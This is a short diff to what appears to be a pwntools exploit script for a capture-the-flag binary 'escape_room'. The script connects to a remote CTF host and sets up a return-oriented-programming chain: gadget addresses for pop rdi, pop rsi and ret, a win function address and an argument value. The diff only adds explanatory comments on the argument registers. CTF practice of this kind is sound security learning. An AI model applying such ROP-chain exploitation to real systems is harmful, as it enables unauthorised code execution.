@@ -9,9 +9,10 @@ context.binary = elf = ELF('./escape_room', checksec=False)
 p = remote('offsec.m0lecon.it', 13570)
 
 # Your exploit here
+# win function expects two specific arguments
 win_addr = 0x0040121b
-pop_rdi = 0x00401287
-pop_rsi = 0x00401289
+pop_rdi = 0x00401287 # RDI: register used to pass the first parameter to a function
+pop_rsi = 0x00401289 # RSI: register used to pass the second parameter to a function
 ret = 0x0040101a
 
 arg_1 = 0xdeadbeef
